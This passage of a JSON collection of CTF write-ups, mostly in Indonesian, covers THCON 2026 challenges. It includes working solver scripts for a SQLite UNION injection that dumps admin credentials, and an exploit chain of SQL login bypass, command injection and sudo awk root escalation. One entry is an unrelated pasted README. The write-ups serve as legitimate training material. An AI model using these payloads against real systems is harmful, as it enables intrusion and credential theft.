        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport struct\r\nimport sys\r\nfrom pathlib import Path\r\n\r\n\r\nMASK64 = (1 << 64) - 1\r\nTABLE_OFF = 0x48940\r\nMULT_OFF = 0x48900\r\nSEED_A_OFF = 0x48978\r\nSEED_B_OFF = 0x48980\r\nSEED_C_OFF = 0x48988\r\n\r\n\r\ndef rol64(value: int, shift: int) -> int:\r\n    return ((value << shift) | (value >> (64 - shift))) & MASK64\r\n\r\n\r\ndef ror64(value: int, shift: int) -> int:\r\n    return ((value >> shift) | (value << (64 - shift))) & MASK64\r\n\r\n\r\ndef u64(data: bytes, offset: int) -> int:\r\n    return struct.unpack_from(\"<Q\", data, offset)[0]\r\n\r\n\r\ndef load_qwords(data: bytes, offset: int, count: int) -> list[int]:\r\n    return list(struct.unpack_from(f\"<{count}Q\", data, offset))\r\n\r\n\r\ndef recover_flag(binary: Path) -> str:\r\n    data = binary.read_bytes()\r\n\r\n    k_table = load_qwords(data, TABLE_OFF, 6)\r\n    multipliers = load_qwords(data, MULT_OFF, 6)\r\n\r\n    seed_a = u64(data, SEED_A_OFF)\r\n    seed_b = u64(data, SEED_B_OFF)\r\n    seed_c = u64(data, SEED_C_OFF)\r\n\r\n    # Rebuild the XOR key used to hide the embedded eBPF object.\r\n    _blob_key = ((((seed_a ^ seed_c) - (seed_c ^ seed_b)) & MASK64) ^ 0x4141414141414141)\r\n\r\n    # These six target values are the comparison constants inside the eBPF\r\n    # program attached to fw_commit. Reaching them in sequence reconstructs\r\n    # the accepted 48-byte token.\r\n    targets = [\r\n        0x66185FCB3AF43C42,\r\n        0xFB9181FC9D741AC9,\r\n        0xF6F76D94D5F19C7C,\r\n        0x9623BE0FA7985447,\r\n        0xC801D5B2EE724650,\r\n        0x9FAAF86A914846EE,\r\n    ]\r\n\r\n    acc = 0\r\n    token = bytearray()\r\n\r\n    for i in range(6):\r\n        mixed = (ror64(targets[i], 13) * pow(multipliers[i], -1, 1 << 64)) & MASK64\r\n        lane = acc ^ mixed\r\n        block = k_table[i] ^ ror64(lane, 7)\r\n        token.extend(block.to_bytes(8, \"little\"))\r\n        acc ^= targets[i]\r\n\r\n    flag = token.decode(\"ascii\")\r\n\r\n    # Keep a small sanity check so the solver fails loudly if offsets change.\r\n    if acc != 0xAAF62074AAD3EE0E:\r\n        raise ValueError(\"unexpected accumulator state while reconstructing token\")\r\n    if not flag.startswith(\"THC{\") or not flag.endswith(\"}\"):\r\n        raise ValueError(\"recovered token does not look like the expected flag format\")\r\n\r\n    return flag\r\n\r\n\r\ndef main() -> int:\r\n    binary = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(\"sst-fwsign\")\r\n    print(recover_flag(binary))\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "THC{int3_s3nt_u_h3r3_3bpf_t00k_1t_fr0m_th3r3!!!}",
    "lessonsLearned": ""
  },
  {
    "id": "thcon2026-stegano-pngisalie",
    "title": "PNG is a lie (part 1/2)",
    "category": "Stegano",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "Challenge ini ternyata jauh lebih sederhana daripada ukuran filenya bikin curiga.",
    "problemDescription": "File `weird_file.thc` bukan PNG, bukan arsip, dan bukan file biner biasa. `file` langsung ngasih tahu kalau isinya cuma teks UTF-8 satu baris yang sangat panjang. Kalau dilihat hexdump awalnya, polanya kelihatan jelas:\n\n- ada emoji `👍`\n- ada emoji `👎`\n- di sela-selanya ada potongan huruf acak\n\nAwalnya kelihatan seperti noise, tapi distribusinya terlalu rapi. Karena judul challenge menyinggung PNG, pendekatan paling masuk akal adalah cari encoding paling simpel dulu.",
    "tools": [],
    "analysis": "Saya cek beberapa hal dasar:\n\n1. `file weird_file.thc`\n2. `xxd -l 128 weird_file.thc`\n3. hitung pola token dan karakter yang muncul\n\nHasil pentingnya:\n\n- file cuma berisi pasangan `emoji + huruf`\n- hurufnya tampak acak\n- emoji cuma dua jenis, jadi kandidat paling natural buat bit `0/1`\n\nDi titik ini saya coba decode paling sederhana: abaikan semua huruf, ambil emoji saja.\n\n- `👍` dijadikan bit `1`\n- `👎` dijadikan bit `0`\n- setiap 8 bit digabung jadi 1 byte\n\nBegitu 8 byte pertama hasil decode dicek, header-nya langsung cocok dengan magic PNG:\n\n`89 50 4e 47 0d 0a 1a 0a`\n\nItu signature PNG yang valid.",
    "solution": [
      {
        "title": "Ekstraksi",
        "content": "Setelah stream emoji di-pack ke byte, hasilnya adalah file PNG valid berukuran `1000x1000`.\n\nLangkah verifikasi yang saya pakai:\n\n- `file decoded_from_emoji.png`\n- `pngcheck -v decoded_from_emoji.png`\n\nGambar hasil decode menampilkan tulisan flag langsung di pojok kanan atas:\n\n`THC{PNG3D}`\n\nTulisan lain seperti `M4terM4xima` dan `much you dying, vewy fun` cuma bagian dari desain gambarnya, bukan flag."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nfrom pathlib import Path\r\nimport os\r\nimport re\r\nimport subprocess\r\nimport sys\r\nimport tempfile\r\n\r\nfrom PIL import Image, ImageEnhance, ImageOps\r\n\r\n\r\nINPUT_FILE = Path(\"weird_file.thc\")\r\nOUTPUT_PNG = Path(\"decoded_from_emoji.png\")\r\nFLAG_RE = re.compile(r\"THC\\{[^}\\s]+\\}\")\r\n\r\n\r\ndef decode_png_from_emoji(src: str) -> bytes:\r\n    bits = []\r\n    for ch in src:\r\n        if ch == \"👍\":\r\n            bits.append(\"1\")\r\n        elif ch == \"👎\":\r\n            bits.append(\"0\")\r\n\r\n    usable = len(bits) - (len(bits) % 8)\r\n    return bytes(int(\"\".join(bits[i:i + 8]), 2) for i in range(0, usable, 8))\r\n\r\n\r\ndef ocr_flag(image_path: Path) -> str | None:\r\n    img = Image.open(image_path)\r\n\r\n    # The visible flag sits in the upper-right corner of the decoded PNG.\r\n    crop = img.crop((760, 0, 1000, 80)).convert(\"L\")\r\n    crop = ImageOps.autocontrast(crop)\r\n    crop = ImageEnhance.Sharpness(crop).enhance(3)\r\n    crop = crop.point(lambda p: 255 if p > 180 else 0)\r\n\r\n    with tempfile.NamedTemporaryFile(\r\n        suffix=\".png\",\r\n        dir=\".\",\r\n        delete=False,\r\n    ) as tmp:\r\n        temp_path = Path(tmp.name)\r\n\r\n    try:\r\n        crop.save(temp_path)\r\n        proc = subprocess.run(\r\n            [\"tesseract\", str(temp_path), \"stdout\", \"--psm\", \"7\"],\r\n            capture_output=True,\r\n            text=True,\r\n            check=False,\r\n        )\r\n        match = FLAG_RE.search(proc.stdout)\r\n        return match.group(0) if match else None\r\n    finally:\r\n        if temp_path.exists():\r\n            temp_path.unlink()\r\n\r\n\r\ndef main() -> int:\r\n    if not INPUT_FILE.exists():\r\n        print(f\"missing input file: {INPUT_FILE}\", file=sys.stderr)\r\n        return 1\r\n\r\n    src = INPUT_FILE.read_text(encoding=\"utf-8\")\r\n    png_data = decode_png_from_emoji(src)\r\n    OUTPUT_PNG.write_bytes(png_data)\r\n\r\n    flag = ocr_flag(OUTPUT_PNG)\r\n    if flag:\r\n        print(flag)\r\n        return 0\r\n\r\n    print(f\"decoded image saved to {OUTPUT_PNG}\")\r\n    print(\"automatic OCR did not find the flag\", file=sys.stderr)\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "THC{PNG3D}",
    "lessonsLearned": ""
  },
  {
    "id": "thcon2026-web-panicinthenorthernquadrant1",
    "title": "Panic In the Northern Quadrant (part 1/3)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "Challenge ini ternyata jauh lebih sederhana daripada kelihatannya di deskripsi. Aku sempat cek beberapa endpoint seperti `download-legacy` dan `backup`, tapi flag part 1 sudah bocor langsung dari halaman utama.",
    "problemDescription": "Halaman `/` menampilkan potongan source JavaScript untuk \"internal use only\". Di bagian bawah HTML ada blok script yang dikomentari. Di dalam komentar itu ada fungsi `backup()` yang memanggil endpoint `backup` dengan body hasil `atob(...)`.\n\nPotongan yang menarik:\n\n```js\n\"body\" : atob(\"dXNlcm5hbWU9c3N0JnBhc3N3b3JkPVRIQ3tzM2N1cjNwNDU1fQ==\")\n```\n\nKalau string base64 itu di-decode, hasilnya:\n\n```text\nusername=sst&password=THC{s3cur3p455}\n```\n\nJadi flag part 1 langsung kelihatan sebagai value `password`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Langkah yang dipakai",
        "content": "1. Buka homepage challenge.\n2. Lihat source HTML/JavaScript.\n3. Cari string base64 yang dipakai oleh fungsi `backup()`.\n4. Decode string tersebut.\n5. Ambil nilai parameter `password`."
      },
      {
        "title": "Catatan",
        "content": "Aku sempat validasi juga bahwa kredensial itu memang dipakai oleh endpoint `backup`, jadi ini bukan string palsu yang sengaja ditaruh buat ngelabui. Tapi untuk solve part 1, decode string di homepage saja sudah cukup."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport base64\r\nimport re\r\nimport sys\r\nfrom urllib.error import HTTPError, URLError\r\nfrom urllib.parse import parse_qs\r\nfrom urllib.request import Request, urlopen\r\n\r\n\r\nTARGET = \"http://panic-in-the-northern-quadrant.ctf.thcon.party:8080/\"\r\n\r\n\r\ndef fetch(url: str) -> str:\r\n    req = Request(url, headers={\"User-Agent\": \"Mozilla/5.0\"})\r\n    with urlopen(req, timeout=10) as resp:\r\n        return resp.read().decode(\"utf-8\", errors=\"replace\")\r\n\r\n\r\ndef main() -> int:\r\n    try:\r\n        html = fetch(TARGET)\r\n    except (HTTPError, URLError) as exc:\r\n        print(f\"[!] failed to fetch target: {exc}\", file=sys.stderr)\r\n        return 1\r\n\r\n    match = re.search(r'atob\\(\"([A-Za-z0-9+/=]+)\"\\)', html)\r\n    if not match:\r\n        print(\"[!] base64 blob not found in homepage source\", file=sys.stderr)\r\n        return 1\r\n\r\n    decoded = base64.b64decode(match.group(1)).decode()\r\n    params = parse_qs(decoded, keep_blank_values=True)\r\n    username = params.get(\"username\", [\"\"])[0]\r\n    password = params.get(\"password\", [\"\"])[0]\r\n\r\n    if not password:\r\n        print(\"[!] password not found after decoding\", file=sys.stderr)\r\n        return 1\r\n\r\n    print(f\"[+] username = {username}\")\r\n    print(f\"[+] password = {password}\")\r\n    print(f\"<FLAG>{password}</FLAG>\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "THC{s3cur3p455}",
    "lessonsLearned": ""
  },
  {
    "id": "thcon2026-web-xssintheweb",
    "title": "XSS_iN_tHe_Web (part 1/2)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "Challenge ini ternyata tidak perlu XSS sama sekali untuk flag pertama. Titik masuk utamanya ada di parameter `id` pada halaman depan.",
    "problemDescription": "Halaman utama menyediakan form:\n\n- `GET /?id=...`\n- hasilnya bisa dilihat di `/view-result`\n\nAwalnya saya cek perilaku normal dengan `id=1` dan aplikasi mengembalikan data agent pertama. Setelah itu saya coba payload UNION sederhana:\n\n```text\n/?id=-1 UNION SELECT 1,2--\n```\n\nPayload itu berhasil dan isi `UNION SELECT` tampil mentah di `/view-result`. Dari sini jelas kalau parameter `id` masuk ke query SQLite tanpa sanitasi yang benar.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Dump schema",
        "content": "Karena jumlah kolom query ada 2, saya pakai:\n\n\n\nHasilnya menunjukkan tabel berikut:\n\n- `adminDBtable`\n- `agents`\n\nSchema yang penting:",
        "code": "-1 UNION SELECT name,sql FROM sqlite_master--"
      },
      {
        "title": "2. Ambil kredensial admin",
        "content": "Setelah tahu nama tabel, tinggal dump isinya:\n\n\n\nHasil:\n\n- username: `admin`\n- password: `S_P3rSicreteP3asseworde%%`",
        "code": "-1 UNION SELECT username,password FROM adminDBtable--"
      },
      {
        "title": "3. Login ke dashboard",
        "content": "Login dengan kredensial di atas berhasil dan dashboard langsung menampilkan flag pertama:",
        "code": "THC{W1tH_eYe5_Wid3_0p3ns_WesTANd}"
      },
      {
        "title": "Kenapa ini berhasil",
        "content": "Backend terlihat membangun query SQL langsung dari nilai `id` tanpa prepared statement. Karena hasil query terakhir disimpan lalu dirender di `/view-result`, payload UNION bisa dipakai bukan cuma untuk bypass, tapi juga buat ekstraksi data database dengan cukup nyaman."
      },
      {
        "title": "Artefak penting",
        "content": "- Endpoint rawan: `/`\n- Parameter rawan: `id`\n- DBMS: SQLite\n- Dampak:\n  - baca schema\n  - baca tabel sensitif\n  - ambil password admin\n  - akses dashboard admin"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nimport re\r\nimport sys\r\n\r\nimport requests\r\n\r\n\r\nBASE = \"http://chal-b12648b1.ctf.thcon.party\"\r\n\r\n\r\ndef main() -> int:\r\n    s = requests.Session()\r\n\r\n    s.get(\r\n        f\"{BASE}/\",\r\n        params={\"id\": \"-1 UNION SELECT username,password FROM adminDBtable--\"},\r\n        timeout=15,\r\n    )\r\n    dumped = s.get(f\"{BASE}/view-result\", timeout=15).text\r\n\r\n    creds = re.search(r\"<tr><td>([^<]+)</td><td>([^<]+)</td></tr>\", dumped)\r\n    if not creds:\r\n        print(\"gagal dump kredensial\")\r\n        return 1\r\n\r\n    username, password = creds.groups()\r\n    print(f\"[+] username = {username}\")\r\n    print(f\"[+] password = {password}\")\r\n\r\n    s.post(\r\n        f\"{BASE}/login\",\r\n        data={\"username\": username, \"password\": password},\r\n        timeout=15,\r\n        allow_redirects=True,\r\n    )\r\n    dashboard = s.get(f\"{BASE}/dashboard\", timeout=15).text\r\n\r\n    flag = re.search(r\"THC\\{[^}]+\\}\", dashboard)\r\n    if not flag:\r\n        print(\"flag tidak ditemukan\")\r\n        return 1\r\n\r\n    print(flag.group(0))\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "THC{W1tH_eYe5_Wid3_0p3ns_WesTANd}",
    "lessonsLearned": ""
  },
  {
    "id": "thcon2026-pwn-climbme-inetutils",
    "title": "GNU inetutils - The GNU Networking Utilities",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "GNU Networking Utilities (Inetutils) are the traditional network\nclients, servers and utilities.  Included are ftp, hostname, ifconfig,\ninetd, logger, ping, rsh, rlogin, talk, telnet, tftp, syslogd,\ntraceroute, whois, and dnsdomainname.",
    "problemDescription": "GNU Networking Utilities (Inetutils) are the traditional network\nclients, servers and utilities.  Included are ftp, hostname, ifconfig,\ninetd, logger, ping, rsh, rlogin, talk, telnet, tftp, syslogd,\ntraceroute, whois, and dnsdomainname.\n\nSend bug reports to <bug-inetutils@gnu.org>.\n\n\nGNU Inetutils is licensed under the GNU General Public License version\n3.0 or later - see the file [COPYING](COPYING).\n\nThe manual (see doc/) is under the GNU Free Documentation License\nversion 1.3 or later, see [doc/fdl-1.3.texi](doc/fdl-1.3.texi).\n\nOther files are licensed as indicated in each file.  There may be\nexceptions to these general rules, see each file for precise\ninformation.\n\nFor any copyright year range specified as YYYY-ZZZZ in this package\nnote that the range specifies every single year in that closed\ninterval.\n\n\nSee the file INSTALL for generic installation instructions.\n\nThe file `paths` contains a list of all paths used by programs in this\ndistribution, and rules to find values for them.  To change a path\nPATH_FOO, you may either tell configure, by using\n`--with-path-foo=VALUE` (where VALUE may contain references to make\nvariables such as `$(bindir)`), or edit the `paths` file.  See further\nbelow for some important cases.\n\nIf you wish to build only the clients or only the servers, you may\nwish to use the `--disable-servers` or `--disable-clients` options\nwhen invoking `configure`.  You can also use `--enable-<program>` or\n`--disable-<program>` to control whether to build individual programs;\nif you explicitly specify whether to build a program, that will\noverride the values specified by `--disable-clients` or\n`--disable-servers`.\n\n\nThe individual utilities were originally derived from the 4.4BSDLite2\ndistribution.  Many features were integrated from NetBSD, OpenBSD,\nFreeBSD and GNU/Linux.\n\n\nIf you are the author of an awesome program and want to join us in\nwriting Free (libre) Software, please consider making it an official\nGNU program and become a GNU Maintainer.  You can find instructions on\nhow to do this here: http://www.gnu.org/help/evaluation\n\n\nSome words on testing are in order.  The three tests `ftp-localhost`,\n`ping`, and `traceroute`, all need to be run by root.  Several tests\nwill depend on infrastructure files in `/etc/`, but most tests will\ncomplain about their obvious needs.  Anyway, these dependencies are\nimportant whenever chrooted builds are conducted.\n\nAt the time of running a test, the shell variables TEST_IPV4 and\nTEST_IPV6 are influential.  Regard them as taking one of three values:\n`yes`, `no`, or `auto`.  When assigned the value `auto`, a small check\nat runtime will determine if the corresponding address family is available,\nand accordingly include it during test.  The values `yes`, and `no`,\ninclude or exclude the corresponding address family unconditionally.\n\nDuring configuration time, TEST_IPV# is essentially set to `auto`,\nexcept that `-enable-ipv#` assigns `yes`, and `--disable-ipv#` assigns\n`no` unconditionally.  Note however, that `--disable-ipv6` retains\nits property of removing all support for IPv6 in every executable,\nwhile `--disable-ipv4` only affects the testing target `check` and scripts.\n\nDuring chrooted tests, the runtime check for either family can be\nfooled, so setting `TEST_IPV6=yes` might be necessary.  On the other\nhand, chrooting similar to a FreeBSD jail, normally changes the address\nof `localhost`, so similar environments will need counteractions like\n`TARGET=10.0.6.1`.\n\n\nThe GNU whois client reads a whois-servers file to figure out which\nwhois server to use.  It won't always pick the best server;\nwhois.internic.net seems to know something about nic.ddn.mil, but the\nGNU whois client will use nic.ddn.mil to look up nic.ddn.mil if you\nuse the configuration file we supply.  Our configuration file probably\nalso does not have a complete list of whois servers; feel free to send\ninformation about additional whois servers to the bug reporting\naddress.\n\n\n - All of the r* client commands, `rcp`, `rlogin`, `rsh`, used to need\n   to be installed as setuid root to work correctly, since they use\n   privileged ports for communication.  However, some modern operating\n   systems now offer capabilities that avoid the need for setuid\n   settings, and this is accounted for in our present code.\n   CAP_NET_BIND_SERVICE and PRIV_NET_PRIVADDR are relevant for the\n   above three programs.\n\n - Similarly, `ping`, `ping6`, and `traceroute`, used to depend on\n   setuid installation, but also these are now content with\n   capabilities like CAP_NET_RAW, PRIV_NET_ICMPACCESS, and\n   PRIV_NET_RAWACCESS.\n\n\n - Some of the buildable executables depend critically on hard-coded\n   file locations for correct execution.  The most important, where\n   care is needed, are highlighted below.\n\n - `ftpd` needs access to several configuration files, in order that\n   all use cases be covered.  Both of PATH_FTPCHROOT and\n   PATH_FTPWELCOME are normally positioned correctly in sysconfdir by\n   default, whereas PATH_FTPUSERS usually is desired to state\n   `/etc/ftpusers`, but not all systems manage this.  Particular care\n   should be given to PATH_FTPLOGINMESG, since it defaults to\n   `/etc/motd`, which cannot be claimed as universally ideal.  A\n   sensible counter measure could be\n\n     `./configure --with-path-ftploginmesg=$(sysconfdir)/ftpmotd`\n\n   This would, however, complicate matter for chrooted users, so a\n   minor variation on the default could be preferable:\n\n     `./configure --with-path-ftploginmesg=/etc/ftpmotd`\n\n   Finally, the fall-back value `/etc/nologin` for PATH_NOLOGIN is in\n   effect for every systems lacking <paths.h>, but this sets the most\n   plausible location in any case.\n\n - `rcp` relies on PATH_RSH for proper hand-over.  Use the\n   configuration switch `--with-path-rsh=VALUE` for overriding the\n   detected value.  It should point to the intended location of `rsh`,\n   particularly when built with Kerberos support.\n\n - Similarly, `rsh` needs PATH_RLOGIN to locate `rlogin` for correct\n   delegation.  The switch `--with-path-rlogin=VALUE` may come handy\n   to ensure that `rsh` as well as `rlogin` offer identical Kerberos\n   support.\n\n\n - Non-Shishi Kerberos support does not build.  Patches welcome.\n\n - Shishi Kerberos support is only implemented for `rcp`, `rlogin`,\n   `rlogind`, `rsh`, `rshd`, `telnet`, and `telnetd`.\n\n - Not all utilities are Kerberized even when built with Kerberos\n   libraries, including `rcp` for non-Shishi Kerberos.\n\n - InetUtils does not build on HP-UX 11.00, Cygwin, Minix, MinGW,\n   MSCV, BeOS, Haiki (and probably other systems as well).  Patches\n   welcome.\n\n========================================================================\n\nCopyright (C) 1997-2025 Free Software Foundation, Inc.\n\nCopying and distribution of this file, with or without modification,\nare permitted in any medium without royalty provided the copyright\nnotice and this notice are preserved.  This file is offered as-is,\nwithout any warranty.",
    "tools": [],
    "analysis": "",
    "solution": [],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "thcon2026-pwn-nocapjustroot-part-1",
    "title": "No Cap Just Root (part 1/8)",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "Challenge ini secara praktik lebih mirip rangkaian web exploitation lalu privilege escalation lokal, bukan binary pwn murni. Entry point awal ada di halaman web, lalu akses `root` didapat dari salah konfigurasi `sudo`.",
    "problemDescription": "Alur exploit-nya:\n\n1. Bypass login dengan SQL injection di `login.php`\n2. Masuk ke `admin.php`\n3. Abuse command injection di parameter `cmd`\n4. Enumerasi hak akses user `web`\n5. Naik ke `root` lewat `sudo /usr/bin/awk`\n6. Baca flag di `/var/www/html/flag.txt`\n\nFlag:\n\n`THC{sqli_and_awk_sudo_is_pure_brainrot}`",
    "tools": [],
    "analysis": "Dari RCE, langkah berikutnya adalah cari jalur privilege escalation. Beberapa temuan penting:\n\n- Working directory aplikasi: `/var/www/html`\n- File flag ada di sana, tapi owned by `root`\n- User `web` punya rule `sudo` yang sangat buruk\n\nHasil `sudo -l`:\n\n```text\nUser web may run the following commands on chal-aaa628d0-75d54c8bcf-pcrcp:\n    (ALL) NOPASSWD: /usr/bin/awk\n```\n\nItu langsung jadi jalur root. `awk` bisa memanggil shell lewat `system()`, jadi pada dasarnya kita diberi eksekusi command sebagai root tanpa password.",
    "solution": [
      {
        "title": "Recon awal",
        "content": "Landing page utama sudah di-deface, tapi source HTML lama masih tertinggal di dalam comment. Dari situ kelihatan beberapa path penting:\n\n- `index.php`\n- `ourteam.php`\n- `admin.php`\n\n`admin.php` saat diakses langsung tidak me-render panel, tapi redirect ke `logout.php`, lalu dari sana ke `login.php`. Jadi fokus langsung pindah ke portal login."
      },
      {
        "title": "1. SQL injection di login",
        "content": "Form login menerima dua field:\n\n- `user`\n- `pass`\n\nSetelah source `login.php` dibaca dari server, query yang dipakai ternyata seperti ini:\n\n\n\nTidak ada prepared statement, tidak ada escaping, jadi bypass klasik langsung jalan:\n\n\n\nServer merespons dengan redirect ke `admin.php`, artinya sesi berhasil dibuat.",
        "code": "$query = \"SELECT id FROM login WHERE pseudo = '$username' AND password = '$password'\";"
      },
      {
        "title": "2. Command injection di panel admin",
        "content": "Setelah login, di halaman admin ada fitur “System checkup” yang mengirim parameter GET bernama `cmd`.\n\nSource `admin.php` menunjukkan bagian rentannya:\n\n\n\nKarena input ditempel langsung ke shell command, kita bisa menambahkan `;` lalu menjalankan command lain.\n\nPayload sederhana untuk bukti RCE:\n\n\n\nOutput:\n\n\n\nJadi kita sudah punya command execution sebagai user `web`.",
        "code": "system(\"timeout 2s ping \" . $_GET[\"cmd\"]);"
      },
      {
        "title": "4. Privilege escalation ke root",
        "content": "Payload final:\n\n\n\nPayload itu dieksekusi melalui command injection di parameter `cmd`, misalnya dengan bentuk:\n\n\n\nHasilnya:",
        "code": "sudo awk 'BEGIN {system(\"id; cat /var/www/html/flag.txt\")}'"
      },
      {
        "title": "Kenapa exploit ini berhasil",
        "content": "Ada tiga masalah yang ditumpuk sekaligus:\n\n1. Login query raw string concat, jadi SQL injection sangat mudah.\n2. Fitur “ping” memanggil `system()` dengan input user tanpa sanitasi.\n3. User web diberi `sudo NOPASSWD` ke `awk`, yang secara praktis sama dengan kasih root shell.\n\nSatu saja dari tiga celah ini sudah buruk. Digabung, challenge ini selesai cukup cepat setelah source code terbaca."
      },
      {
        "title": "File yang saya buat",
        "content": "- `exploit.py` untuk menjalankan chain exploit secara otomatis"
      },
      {
        "title": "Cara pakai exploit",
        "content": "Aktifkan virtualenv yang sudah kamu kasih:\n\n\n\nJalankan:\n\n\n\nKalau mau pakai RCE yang sama untuk command lain:",
        "code": "source /home/nata/ctf_env/bin/activate"
      },
      {
        "title": "Catatan akhir",
        "content": "Walau kategorinya ditulis `pwn`, challenge part ini sebenarnya lebih terasa seperti web foothold + local privesc. Titik masuknya bukan memory corruption, tapi kombinasi SQLi, command injection, dan sudo misconfiguration."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport html\r\nimport sys\r\n\r\nimport requests\r\n\r\n\r\ndef extract_pre(body: str) -> str:\r\n    start = body.find(\"<pre>\")\r\n    end = body.find(\"</pre>\", start)\r\n    if start == -1 or end == -1:\r\n        return body\r\n    return html.unescape(body[start + 5 : end])\r\n\r\n\r\ndef run_cmd(session: requests.Session, base_url: str, command: str) -> str:\r\n    payload = f\"127.0.0.1;{command}\"\r\n    response = session.get(\r\n        f\"{base_url}/admin.php\",\r\n        params={\"cmd\": payload},\r\n        timeout=20,\r\n    )\r\n    response.raise_for_status()\r\n    return extract_pre(response.text)\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Exploit for THCON 2026 - No Cap Just Root (part 1/8)\"\r\n    )\r\n    parser.add_argument(\r\n        \"--url\",\r\n        default=\"http://chal-aaa628d0.ctf.thcon.party\",\r\n        help=\"Base challenge URL\",\r\n    )\r\n    parser.add_argument(\r\n        \"--cmd\",\r\n        help=\"Run an arbitrary post-auth command via the admin.php injection point\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    session = requests.Session()\r\n\r\n    login = session.post(\r\n        f\"{args.url}/login.php\",\r\n        data={\"user\": \"' or 1=1 -- -\", \"pass\": \"x\"},\r\n        allow_redirects=False,\r\n        timeout=10,\r\n    )\r\n    login.raise_for_status()\r\n\r\n    if login.headers.get(\"Location\") != \"admin.php\":\r\n        print(\"[-] SQLi login bypass failed\", file=sys.stderr)\r\n        return 1\r\n\r\n    if args.cmd:\r\n        print(run_cmd(session, args.url, args.cmd))\r\n        return 0\r\n\r\n    flag_cmd = \"\"\"sudo awk 'BEGIN {system(\"id; cat /var/www/html/flag.txt\")}'\"\"\"\r\n    output = run_cmd(session, args.url, flag_cmd)\r\n    print(output)\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "THC{sqli_and_awk_sudo_is_pure_brainrot}",
    "lessonsLearned": ""
  },
  {
    "id": "thcon2026-pwn-nocapjustroot-part-3",
    "title": "No Cap Just Root (part 3/8)",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "THCON 2026",
    "tags": [],
    "description": "Part ini melanjutkan foothold dari part sebelumnya. Kunci SSH milik attacker yang sudah didapat di part 2 ternyata masih berlaku, tapi service SSH dibungkus gate aneh di port challenge.",
    "problemDescription": "Alur solve:\n\n1. Identifikasi bahwa port `46809` sebenarnya adalah SSH yang dibungkus filter\n2. Bypass gate dengan banner client SSH yang mengandung komentar `HTTP/1.0`\n3. Login sebagai `p4t4t0rz` memakai private key yang ditinggalkan attacker\n4. Temukan binary SUID root `skibidi_shell`\n5. Eksploit buffer overflow di menu `Cook Exploit`\n6. Gunakan ROP chain untuk `open(\"/root/flag.txt\")`, `read()`, lalu `write()`\n\nFlag:\n\n`THC{S0m3_R0P_Ch41n_M4g1c}`",
    "tools": [],
    "analysis": "`checksec`:\n\n```text\nArch: amd64\nRELRO: Full RELRO\nCanary: No\nNX: Enabled\nPIE: No\nStripped: No\n```\n\nKarena binary tidak strip, analisis jauh lebih cepat. Fungsi menarik:\n\n- `cook_exploit`\n- `summon_rizzler`\n- `vibe_check`\n- helper gadget seperti `useful_gadgets`, `syscall_gadget`, `move_rax_rdi`\n\nBug utamanya ada di `cook_exploit`.\n\nPotongan logika penting:\n\n```c\nchar attacker_ip[0x50];\nread(0, attacker_ip, 0x1940);\n```\n\nJadi ada overflow besar ke stack. Offset ke RIP adalah `0x58`.\n\nCatatan penting: fungsi ini sebelumnya memakai `scanf`, lalu baru `read`. Karena itu exploit lebih stabil jika input dikirim interaktif per tahap, bukan dari file redirection sekali jalan.",
    "solution": [
      {
        "title": "Recon awal",
        "content": "Service yang diberikan:\n\n\n\nKalau diakses mentah, service cuma menjawab:\n\n\n\nAwalnya ini kelihatan seperti service custom biasa, tapi setelah diproblemkan sedikit lebih jauh, ada perilaku aneh:\n\n- request tertentu memunculkan banner `SSH-2.0-OpenSSH_10.2`\n- `nmap -sV -p 46809` juga mengenali servicenya sebagai SSH\n\nJadi kesimpulan awalnya: port ini adalah SSH yang ditaruh di belakang wrapper/filter.",
        "code": "nc 20.40.135.232 46809"
      },
      {
        "title": "Bypass gate SSH",
